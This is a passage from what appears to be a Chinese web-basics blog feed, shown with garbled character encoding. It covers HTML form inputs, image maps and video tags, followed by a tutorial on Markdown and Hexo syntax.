<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"range"</span> <span class="attr">min</span>=<span class="string">"-100"</span> <span class="attr">max</span>=<span class="string">"100"</span> <span class="attr">value</span>=<span class="string">"50"</span>&gt;</span><span class="comment">&lt;!-- å¯æ»‘åŠ¨ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    è¯·é€‰ä¸€ä¸ªæ¥è¿›è¡Œé€‰æ‹©</span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>é€‰æ‹©1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>é€‰æ‹©2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>é€‰æ‹©3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>é€‰æ‹©4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ä¸ä¸Šé¢ä¸åŒçš„æ˜¯å¯ä»¥ä¸é€‰æ‹©æä¾›çš„é€‰é¡¹ï¼Œè€Œè¾“å…¥è‡ªå·±çš„é€‰é¡¹ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">list</span>=<span class="string">"testList"</span> <span class="attr">placeholder</span>=<span class="string">"è¯·è¾“å…¥ä½ çš„é€‰æ‹©"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">datalist</span> <span class="attr">id</span>=<span class="string">"testList"</span>&gt;</span><span class="comment">&lt;!-- å¿…é¡»é…åˆtype="text"æ¥ä½¿ç”¨ï¼Œå¦åˆ™ä¸ä¼šå•ç‹¬æ˜¾ç¤º --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>é€‰æ‹©1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>é€‰æ‹©2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>é€‰æ‹©3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>é€‰æ‹©4<span class="tag">&lt;/<span class="name">option</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">datalist</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"date"</span>&gt;</span><span class="comment">&lt;!-- æ—¥æœŸç±»å‹ ä¸æ”¯æŒIEï¼Œç«ç‹æµè§ˆå™¨ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ç”¨æˆ·è™½ç„¶çœ‹ä¸åˆ°ï¼Œä½†æ˜¯æäº¤è¡¨å•çš„æ—¶å€™ä¼šæŠŠvalueå€¼ä¸€èµ·æäº¤ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"éšè—çš„å†…å®¹"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">"password.png"</span> <span class="attr">width</span>=<span class="string">"20px"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å¦‚æœè¦ä¸Šä¼ æ–‡ä»¶çš„è¯ï¼Œå¿…é¡»è®¾ç½®å±æ€§ form enctype="multipart/form-data" --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">multiple</span>&gt;</span><span class="comment">&lt;!-- multipleæ˜¯æŒ‡æ”¯æŒå¤šä¸ªæ–‡ä»¶ä¸Šä¼  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">required</span>&gt;</span><span class="comment">&lt;!-- requiredæ˜¯æŒ‡å¿…é¡»ä¸Šä¼ æ–‡ä»¶ --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h2 id="åˆ›å»ºåˆ†åŒºå“åº”å›¾"><a href="#åˆ›å»ºåˆ†åŒºå“åº”å›¾" class="headerlink" title="åˆ›å»ºåˆ†åŒºå“åº”å›¾"></a>åˆ›å»ºåˆ†åŒºå“åº”å›¾</h2><p>åˆ†åŒºå“åº”å›¾æ˜¯æŒ‡ï¼šå°†ä¸€å¼ å›¾ç‰‡è¿›è¡Œåˆ’åˆ†ï¼Œç”¨æˆ·ç‚¹å‡»ä¸åŒçš„åŒºåŸŸçš„æ—¶å€™ï¼Œè§¦å‘ä¸åŒçš„ç‚¹å‡»äº‹ä»¶ã€‚</p>
<p>è¯¥å›¾éœ€è¦è®¾ç½®usemapå±æ€§ï¼Œå±æ€§å€¼æ˜¯ä¸€ä¸ªmapçš„IDåï¼Œmapç”±areaç»„æˆï¼Œå³areaæ˜¯è§¦å‘ç‚¹å‡»çš„åŒºåŸŸï¼Œè€Œareaçš„shapeå±æ€§è¯´æ˜ç”±ä¸‹è¡¨ç»™å‡ºï¼š</p>
<table border="1px">
        <tr>
            <!-- è¡Œ -->
            <th>shapeçš„å€¼</th> <!-- è¡¨å¤´ -->
            <th>coordså±æ€§è§£é‡Š</th>
        </tr>
        <tr>
            <!-- ç¬¬äºŒè¡Œ -->
            <td>Rect</td><!-- å•å…ƒæ ¼ -->
            <td>è¿™ä¸ªå€¼ä»£è¡¨çŸ©å½¢åŒºåŸŸï¼Œç”¨å››ä¸ªé€—å·åˆ†å‰²çš„æ•´æ•°æè¿°ï¼Œå³
                å›¾åƒå·¦è¾¹ç¼˜
                å›¾åƒä¸Šè¾¹ç¼˜
                å›¾åƒå³è¾¹ç¼˜
                å›¾åƒä¸‹è¾¹ç¼˜
            </td><!-- å•å…ƒæ ¼ -->
        </tr>
        <tr>
            <!-- ç¬¬ä¸‰è¡Œ -->
            <td>Circle</td><!-- å•å…ƒæ ¼ -->
            <td>è¿™ä¸ªå€¼ä»£è¡¨åœ†å½¢åŒºåŸŸï¼Œç”¨ä¸‰ä¸ªé€—å·åˆ†å‰²çš„æ•´æ•°æè¿°ï¼Œå³
                å›¾åƒå·¦è¾¹ç¼˜åˆ°åœ†å¿ƒçš„è·ç¦»
                å›¾åƒä¸Šè¾¹ç¼˜åˆ°åœ†å¿ƒçš„è·ç¦»
                åœ†çš„åŠå¾„
            </td><!-- å•å…ƒæ ¼ -->
        </tr>
        <tr>
            <!-- ç¬¬å››è¡Œ -->
            <td>Poly</td><!-- å•å…ƒæ ¼ -->
            <td>è¿™ä¸ªå€¼ä»£è¡¨å¤šè¾¹å½¢åŒºåŸŸï¼Œç”¨è‡³å°‘å…­ä¸ªé€—å·åˆ†å‰²çš„æ•´æ•°æè¿°ï¼Œæ¯ä¸€ä¸ªæ•°å­—è¡¨ç¤ºå¤šè¾¹å½¢çš„ä¸€ä¸ªé¡¶ç‚¹
            </td><!-- å•å…ƒæ ¼ -->
        </tr>
        <tr>
            <!-- ç¬¬äº”è¡Œ -->
            <td>Default</td><!-- å•å…ƒæ ¼ -->
            <td>è¿™ä¸ªå€¼ä»£è¡¨é»˜è®¤åŒºåŸŸï¼Œä¸éœ€è¦è®¾ç½®coordsçš„å€¼ï¼Œå³é»˜è®¤è¦†ç›–æ•´å¼ å›¾ç‰‡
            </td><!-- å•å…ƒæ ¼ -->
        </tr>
</table>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"OIP.png"</span> <span class="attr">usemap</span>=<span class="string">"#test_map"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span> <span class="attr">name</span>=<span class="string">"test_map"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">href</span>=<span class="string">"4.html"</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"4,10,63,66"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">href</span>=<span class="string">"9.html"</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"64,10,120,66"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="è½½å…¥è§†é¢‘"><a href="#è½½å…¥è§†é¢‘" class="headerlink" title="è½½å…¥è§†é¢‘"></a>è½½å…¥è§†é¢‘</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"test_video.mp4"</span> <span class="attr">controls</span> <span class="attr">poster</span>=<span class="string">"cut.png"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å±æ€§</th>
<th>å±æ€§ä»‹ç»</th>
</tr>
</thead>
<tbody><tr>
<td>src</td>
<td>è§†é¢‘åœ°å€</td>
</tr>
<tr>
<td>width</td>
<td>è§†é¢‘å®½åº¦</td>
</tr>
<tr>
<td>height</td>
<td>è§†é¢‘é«˜åº¦</td>
</tr>
<tr>
<td>autoplay</td>
<td>ç½‘é¡µå®Œæˆåè‡ªåŠ¨æ’­æ”¾</td>
</tr>
<tr>
<td>preload</td>
<td>æ˜¯å¦åœ¨é¡µé¢åŠ è½½åè½½å…¥è§†é¢‘ã€‚<br>auto - å½“é¡µé¢åŠ è½½åè½½å…¥æ•´ä¸ªè§†é¢‘<br>metadata- å½“é¡µé¢åŠ è½½ååªè½½å…¥ç¬¬ä¸€å¸§<br>none - å½“é¡µé¢åŠ è½½åä¸è½½å…¥è§†é¢‘</td>
</tr>
<tr>
<td>controls</td>
<td>å‘ç”¨æˆ·æ˜¾ç¤ºæ§ä»¶ï¼Œæ¯”å¦‚æ’­æ”¾æŒ‰é’®</td>
</tr>
<tr>
<td>loop</td>
<td>å½“åª’ä»‹æ–‡ä»¶å®Œæˆæ’­æ”¾åå†æ¬¡å¼€å§‹æ’­æ”¾ã€‚</td>
</tr>
<tr>
<td>poster</td>
<td>è§†é¢‘å°é¢</td>
</tr>
</tbody></table>
<p>ç”±äºä¸åŒçš„æµè§ˆå™¨æ”¯æŒçš„è§†é¢‘æ ¼å¼ä¸ä¸€æ ·ï¼ŒåŒä¸€æ¬¾æµè§ˆå™¨ç‰ˆæœ¬ä¸åŒï¼Œæ”¯æŒçš„è§†é¢‘æ ¼å¼ä¹Ÿä¸åŒï¼Œä½†æ˜¯MP4æ ¼å¼å’Œoggæ ¼å¼çš„è§†é¢‘å‡ ä¹è¦†ç›–äº†å¤§å¤šæ•°æµè§ˆå™¨çš„å¤§å¤šæ•°ç‰ˆæœ¬ï¼Œå› æ­¤ä¸€èˆ¬åœ¨è½½å…¥è§†é¢‘çš„åœ°æ–¹å‡†å¤‡å¥½ä¸¤ç§ç´ æå°±å¯ä»¥äº†</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"test_video.mp4"</span> <span class="attr">controls</span> <span class="attr">poster</span>=<span class="string">"cut.png"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"test_video.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span> <span class="comment">&lt;!-- é»˜è®¤ä½¿ç”¨è¿™ä¸ªèµ„æºæ’­æ”¾ï¼Œæ’­æ”¾å¤±è´¥åˆ™æ’­æ”¾ä¸‹é¢çš„ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"test_video.ogg"</span> <span class="attr">type</span>=<span class="string">"video/ogg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WebåŸºç¡€</category>
      </categories>
      <tags>
        <tag>htmlåŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>markdownçš„ç›¸å…³è¯­æ³•</title>
    <url>/2020/02/23/markdown%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Markdownæ˜¯ä¸€ç§å¯ä»¥ä½¿ç”¨æ™®é€šæ–‡æœ¬ç¼–è¾‘å™¨ç¼–å†™çš„<a href="https://baike.baidu.com/item/æ ‡è®°è¯­è¨€/5964436" target="_blank" rel="noopener">æ ‡è®°è¯­è¨€</a>ï¼Œé€šè¿‡ç®€å•çš„æ ‡è®°è¯­æ³•ï¼Œå®ƒå¯ä»¥ä½¿æ™®é€šæ–‡æœ¬å†…å®¹å…·æœ‰ä¸€å®šçš„æ ¼å¼ã€‚</p>
<p>Markdownå…·æœ‰ä¸€ç³»åˆ—è¡ç”Ÿç‰ˆæœ¬ï¼Œç”¨äºæ‰©å±•Markdownçš„åŠŸèƒ½ï¼ˆå¦‚è¡¨æ ¼ã€è„šæ³¨ã€å†…åµŒHTMLç­‰ç­‰ï¼‰ï¼Œè¿™äº›åŠŸèƒ½åŸåˆçš„Markdownå°šä¸å…·å¤‡ï¼Œå®ƒä»¬èƒ½è®©Markdownè½¬æ¢æˆæ›´å¤šçš„æ ¼å¼ï¼Œä¾‹å¦‚LaTeXï¼ŒDocbookã€‚Markdownå¢å¼ºç‰ˆä¸­æ¯”è¾ƒæœ‰åçš„æœ‰Markdown Extraã€MultiMarkdownã€ Marukuç­‰ã€‚è¿™äº›è¡ç”Ÿç‰ˆæœ¬è¦ä¹ˆåŸºäºå·¥å…·ï¼Œå¦‚Pandocï¼›è¦ä¹ˆåŸºäºç½‘ç«™ï¼Œå¦‚GitHubå’ŒWikipediaï¼Œåœ¨è¯­æ³•ä¸ŠåŸºæœ¬å…¼å®¹ï¼Œä½†åœ¨ä¸€äº›è¯­æ³•å’Œæ¸²æŸ“æ•ˆæœä¸Šæœ‰æ”¹åŠ¨ã€‚</p>
<p>Markdownæ–‡ä»¶åæœŸå¯ä»¥è½¬æ¢æˆhtmlæ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨mdæ–‡ä»¶ä¸­ç›´æ¥ä½¿ç”¨htmlè¯­è¨€ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<h2 id="è¯­æ³•ä»‹ç»"><a href="#è¯­æ³•ä»‹ç»" class="headerlink" title="è¯­æ³•ä»‹ç»"></a>è¯­æ³•ä»‹ç»</h2><h3 id="1-æ ‡é¢˜ï¼ˆæ³¨æ„ï¼Œè®¸å¤šåœ°æ–¹ä¸€å®šä¸è¦å¿˜äº†åŠ ç©ºæ ¼ï¼‰"><a href="#1-æ ‡é¢˜ï¼ˆæ³¨æ„ï¼Œè®¸å¤šåœ°æ–¹ä¸€å®šä¸è¦å¿˜äº†åŠ ç©ºæ ¼ï¼‰" class="headerlink" title="1.æ ‡é¢˜ï¼ˆæ³¨æ„ï¼Œè®¸å¤šåœ°æ–¹ä¸€å®šä¸è¦å¿˜äº†åŠ ç©ºæ ¼ï¼‰"></a>1.æ ‡é¢˜ï¼ˆæ³¨æ„ï¼Œè®¸å¤šåœ°æ–¹ä¸€å®šä¸è¦å¿˜äº†åŠ ç©ºæ ¼ï¼‰</h3><p>æ ‡é¢˜çš„æ ¼å¼ä¸º â€œ#â€+ç©ºæ ¼+æ ‡é¢˜åï¼Œå…¶ä¸­â€œ#â€çš„ä¸ªæ•°ä»£è¡¨è¿™æ˜¯å‡ çº§æ ‡é¢˜ï¼Œä½†æ˜¯æœ€å¤šåªèƒ½æœ‰6çº§æ ‡é¢˜</p>
 <a id="more"></a> 

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ä¸€çº§æ ‡é¢˜</span><br><span class="line">### ä¸‰çº§æ ‡é¢˜</span><br><span class="line">###### å…­çº§æ ‡é¢˜</span><br><span class="line">####### è¿™æ˜¯ä¸€ä¸ªé”™è¯¯çš„å†™æ³•</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„ä»£ç ç­‰æ•ˆäº</p>
<h1 id="ä¸€çº§æ ‡é¢˜"><a href="#ä¸€çº§æ ‡é¢˜" class="headerlink" title="ä¸€çº§æ ‡é¢˜"></a>ä¸€çº§æ ‡é¢˜</h1><h3 id="ä¸‰çº§æ ‡é¢˜"><a href="#ä¸‰çº§æ ‡é¢˜" class="headerlink" title="ä¸‰çº§æ ‡é¢˜"></a>ä¸‰çº§æ ‡é¢˜</h3><h6 id="å…­çº§æ ‡é¢˜"><a href="#å…­çº§æ ‡é¢˜" class="headerlink" title="å…­çº§æ ‡é¢˜"></a>å…­çº§æ ‡é¢˜</h6><p>####### è¿™æ˜¯ä¸€ä¸ªé”™è¯¯çš„å†™æ³•</p>
<hr>
<h3 id="2-å­—ä½“"><a href="#2-å­—ä½“" class="headerlink" title="2.å­—ä½“"></a>2.å­—ä½“</h3><ul>
<li>æ–œä½“ï¼šåœ¨æ¬²æ˜¾ç¤ºæ–œä½“å†…å®¹çš„ä¸¤å¤´åŠ â€œ*â€</li>
<li>åŠ ç²—ï¼šåœ¨æ¬²æ˜¾ç¤ºåŠ ç²—å†…å®¹çš„ä¸¤å¤´åŠ â€œ**â€</li>
<li>ç²—æ–œä½“ï¼šåœ¨æ¬²æ˜¾ç¤ºç²—æ–œä½“å†…å®¹çš„ä¸¤å¤´åŠ â€œ***â€<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*è¿™æ˜¯æ–œä½“*</span><br><span class="line">**è¿™æ˜¯ç²—ä½“**</span><br><span class="line">***è¿™æ˜¯ç²—æ–œä½“***</span><br></pre></td></tr></table></figure>
ä¸Šé¢çš„ä»£ç ç­‰æ•ˆäº</li>
</ul>
<p><em>è¿™æ˜¯æ–œä½“</em><br><strong>è¿™æ˜¯ç²—ä½“</strong><br><strong><em>è¿™æ˜¯ç²—æ–œä½“</em></strong></p>
<ul>
<li><p>è¿›é˜¶ä½¿ç”¨</p>
<p>æŒ‡å®šå­—ä½“ï¼š</p>
<pre><code>&lt;font face=&quot;é»‘ä½“&quot;&gt;é»‘ä½“å­—&lt;/font&gt;
&lt;font face=&quot;STCAIYUN&quot;&gt;æˆ‘æ˜¯åæ–‡å½©äº‘&lt;/font&gt;</code></pre><p>æŒ‡å®šå¤§å°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;font size&#x3D;20&gt;å¤§å°&#x3D;20&lt;&#x2F;font&gt;</span><br></pre></td></tr></table></figure>

<p>æŒ‡å®šé¢œè‰²ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;font color&#x3D;#ff0000&gt;çº¢è‰²&lt;&#x2F;font&gt;</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h3 id="3-åˆ—è¡¨"><a href="#3-åˆ—è¡¨" class="headerlink" title="3.åˆ—è¡¨"></a>3.åˆ—è¡¨</h3><ul>
<li><p>æ— åºåˆ—è¡¨<br>â€œ-â€+ç©ºæ ¼+é¡¹ç›®å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- é¡¹ç›®ä¸€</span><br><span class="line">- é¡¹ç›®äºŒ</span><br></pre></td></tr></table></figure>
</li>
<li><p>æœ‰åºåˆ—è¡¨<br>æ•°å­—+â€œ.â€+ç©ºæ ¼+é¡¹ç›®å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. é¡¹ç›®ä¸‰</span><br><span class="line">2. é¡¹ç›®å››</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ç­‰æ•ˆäº</p>
<ul>
<li>é¡¹ç›®ä¸€</li>
<li>é¡¹ç›®äºŒ</li>
</ul>
<ol>
<li><p>é¡¹ç›®ä¸‰</p>
</li>
<li><p>é¡¹ç›®å››</p>
</li>
</ol>
</li>
</ul>
<h3 id="4-è¡¨æ ¼"><a href="#4-è¡¨æ ¼" class="headerlink" title="4.è¡¨æ ¼"></a>4.è¡¨æ ¼</h3><p>ç¬¬ä¸€è¡Œæ˜¯ç”¨â€œ|â€åˆ†å¼€çš„è¡¨å¤´<br>ç¬¬äºŒè¡Œæ˜¯æ¯ä¸€åˆ—çš„å¯¹é½æ–¹å¼ï¼Œâ€œ:â€åœ¨â€œ-â€çš„å·¦è¾¹æ˜¯å·¦å¯¹é½ï¼Œåœ¨å³è¾¹æ˜¯å³å¯¹é½ï¼Œæ²¡æœ‰â€œ:â€åˆ™é»˜è®¤æ˜¯å·¦å¯¹é½<br>ç¬¬ä¸‰è¡Œå¼€å§‹æ¯ä¸€å•å…ƒæ ¼ç”¨â€œ|â€åˆ†å¼€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|ä¸Šåˆ|ä¸‹åˆ|æ™šä¸Š|</span><br><span class="line">|:-|:-:|-:|</span><br><span class="line">|å†™BUG(å·¦å¯¹é½)|æŸ¥BUG(å±…ä¸­å¯¹é½)|æ”¹BUG(å³å¯¹é½)|</span><br><span class="line">| å†™BUG(å·¦å¯¹é½) | æŸ¥BUG(å±…ä¸­å¯¹é½) | æ”¹BUG(å³å¯¹é½) |</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä»£ç ç­‰ä»·äº</p>
<table>
<thead>
<tr>
<th align="left">ä¸Šåˆ</th>
<th align="center">ä¸‹åˆ</th>
<th align="right">æ™šä¸Š</th>
</tr>
</thead>
<tbody><tr>
<td align="left">å†™BUG(å·¦å¯¹é½)</td>
<td align="center">æŸ¥BUG(å±…ä¸­å¯¹é½)</td>
<td align="right">æ”¹BUG(å³å¯¹é½)</td>
</tr>
<tr>
<td align="left">å†™BUG(å·¦å¯¹é½)</td>
<td align="center">æŸ¥BUG(å±…ä¸­å¯¹é½)</td>
<td align="right">æ”¹BUG(å³å¯¹é½)</td>
</tr>
</tbody></table>
<h3 id="5-è¶…é“¾æ¥"><a href="#5-è¶…é“¾æ¥" class="headerlink" title="5.è¶…é“¾æ¥"></a>5.è¶…é“¾æ¥</h3><p>è¶…é“¾æ¥çš„æ ¼å¼ä¸ºï¼š[æè¿°]+(url)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[è¿™æ˜¯ä¸€ä¸ªè¶…é“¾æ¥](http:&#x2F;&#x2F;ruixin_huang.gitee.io&#x2F;mblog&#x2F;)</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„ä»£ç ç­‰ä»·äº<br><a href="https://yalexin.gitee.io">è¿™æ˜¯ä¸€ä¸ªè¶…é“¾æ¥</a></p>
<h3 id="6-å›¾ç‰‡"><a href="#6-å›¾ç‰‡" class="headerlink" title="6.å›¾ç‰‡"></a>6.å›¾ç‰‡</h3><p>å¯ä»¥è¿™æ ·å­å¼•ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![è¿™æ˜¯ä¸€å¼ ç½‘ç»œå›¾ç‰‡](https:&#x2F;&#x2F;tse3-mm.cn.bing.net&#x2F;th&#x2F;id&#x2F;OIP.UZQDK3pvdgKAoHoUVhyAhgHaDt?w&#x3D;299&amp;h&#x3D;149&amp;c&#x3D;7&amp;o&#x3D;5&amp;pid&#x3D;1.7 &quot;ç½‘ç»œå›¾ç‰‡&quot;)</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢ä»£ç ç­‰æ•ˆäº<br><img src="https://tse3-mm.cn.bing.net/th/id/OIP.UZQDK3pvdgKAoHoUVhyAhgHaDt?w=299&h=149&c=7&o=5&pid=1.7" alt="è¿™æ˜¯ä¸€å¼ ç½‘ç»œå›¾ç‰‡ï¼Œéšç€æ—¶é—´æµé€é“¾æ¥æœ‰å¯èƒ½å¤±æ•ˆ"><br>å½“ç„¶äº†ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä¿®æ”¹å›¾ç‰‡å±æ€§ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸è¿‡æ˜¯è¦å†™æˆhtmlæ ¼å¼çš„<br>å¦‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;tse3-mm.cn.bing.net&#x2F;th&#x2F;id&#x2F;OIP.UZQDK3pvdgKAoHoUVhyAhgHaDt?w&#x3D;299&amp;h&#x3D;149&amp;c&#x3D;7&amp;o&#x3D;5&amp;pid&#x3D;1.7 &quot; width&#x3D;500&#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„ä»£ç ç­‰ä»·äº<br><img src="https://tse3-mm.cn.bing.net/th/id/OIP.UZQDK3pvdgKAoHoUVhyAhgHaDt?w=299&h=149&c=7&o=5&pid=1.7 " width="500/"><br>åœ¨hexoä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„æ–¹æ³•æ˜¾ç¤ºæœ¬åœ°å›¾ç‰‡</p>
<ol>
<li><p>åœ¨åšå®¢æ ¹ç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶ä¸­ï¼ŒæŠŠpost_asset_folderå±æ€§æ”¹ä¸ºtrueï¼Œè¿™æ ·å­æˆ‘ä»¬æ¯æ¬¡ç”¨newæŒ‡ä»¤æ–°å»ºæ–‡ç« çš„æ—¶å€™ï¼Œhexoå°±ä¼šè‡ªåŠ¨åœ¨æ–‡ç« æ‰€åœ¨ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªä¸æ–‡ç« åŒåçš„æ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹æ”¾ç½®æˆ‘ä»¬æ‰€éœ€è¦æ˜¾ç¤ºçš„å›¾ç‰‡èµ„æºæ–‡ä»¶</p>
</li>
<li><p>åœ¨éœ€è¦æ˜¾ç¤ºå›¾ç‰‡çš„åœ°æ–¹è¾“å…¥ä»¥ä¸‹ä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img å›¾ç‰‡ååŠ æ–‡ä»¶åç¼€ å›¾ç‰‡æè¿°(å¯çœ) %&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img 317325.jpg è¿™æ˜¯ä¸€å¼ æœ¬åœ°å›¾ç‰‡æ–‡ä»¶ %&#125;</span><br></pre></td></tr></table></figure>

<p>ç­‰ä»·äº</p>
<img src="/2020/02/23/markdown%E8%AF%AD%E6%B3%95/317325.jpg" class title="è¿™æ˜¯ä¸€å¼ æœ¬åœ°å›¾ç‰‡æ–‡ä»¶">

<p>ä¹Ÿå¯ä»¥å€ŸåŠ©ä¸ƒç‰›äº‘å›¾åºŠï¼Œå°†æˆ‘ä»¬çš„å›¾ç‰‡ä¸Šä¼ åå¼•ç”¨å›¾ç‰‡çš„é“¾æ¥ã€‚</p>
<h3 id="7-ä»£ç å—"><a href="#7-ä»£ç å—" class="headerlink" title="7.ä»£ç å—"></a>7.ä»£ç å—</h3><p>ä»£ç çš„æ ¼å¼æ˜¯ç”¨ä¸‰ä¸ªåå¼•å·å°†ä»£ç åŒ…èµ·æ¥ï¼Œå¹¶ä¸”è¿™ä¸‰ä¸ªåå¼•å·è¦åˆ†åˆ«ç‹¬å ä¸€è¡Œ<br>å¦‚ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(```)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"è¿™æ˜¯ä¸€æ®µæ²¡æœ‰BUGçš„ä»£ç "</span>);</span><br><span class="line">(```)</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢ä»£ç ç­‰æ•ˆäº</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"è¿™æ˜¯ä¸€æ®µæ²¡æœ‰BUGçš„ä»£ç "</span>);</span><br></pre></td></tr></table></figure>

